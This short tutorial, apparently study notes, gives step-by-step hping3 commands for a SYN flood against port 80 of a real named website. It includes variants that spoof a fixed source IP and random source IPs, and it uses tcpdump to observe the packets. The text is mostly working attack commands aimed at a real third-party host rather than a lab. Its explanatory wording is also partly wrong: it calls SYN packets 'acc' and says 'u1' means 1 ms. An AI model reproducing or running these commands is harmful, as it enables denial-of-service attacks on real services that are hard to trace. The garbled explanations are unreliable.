## Creating syn flooding

### Step 1 ( sending acc to target website )

```shell

hping3 --help

## sending acc to port 80 of (sans.org) website

hping3 -i u1 -S -p 80 sans.org

## sending acc to port 80 of (sans.org) website from ip 192.168.33.7

hping3 -i u1 -S -p 80 sans.org -a 192.168.33.7

```

### Step 2 ( sending acc to target website from random ip address )

```shell

# sending acc to port 80 of (sans.org) website from random_ip_address # u1 means 1 ms

hping3 -i u1 -S -p 80 sans.org -a *random_ip_address

## showing this package that send from this ip

tcpdump

```

